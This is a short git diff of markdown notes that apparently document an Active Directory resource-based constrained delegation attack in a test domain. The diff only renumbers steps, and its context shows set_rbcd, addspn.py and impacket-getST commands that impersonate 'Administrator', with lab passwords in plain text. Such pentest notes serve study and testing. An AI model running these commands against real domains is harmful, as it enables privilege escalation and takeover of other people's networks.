@@ -20,7 +20,7 @@ set_rbcd WIN-NUU0DPB1BVC$ TestAlpha
 ```
 
 
-2) Add SPN to current user
+1) Add SPN to current user
 
 ```bash
 # -u == account we're using
@@ -30,7 +30,7 @@ python3 utils/krbrelayx/addspn.py -u 'CONTOSO\TestAcc' -p 'win2016-cli-P@$swd' -
 ```
 
 
-3) Get a TGS for any user to a target service
+1) Get a TGS for any user to a target service
 
 ```bash
 impacket-getST -spn 'HOST/WIN-NUU0DPB1BVC' -impersonate 'Administrator' -dc-ip 192.168.68.64 'contoso.org/TestAlpha:win10-gui-P@$swd'
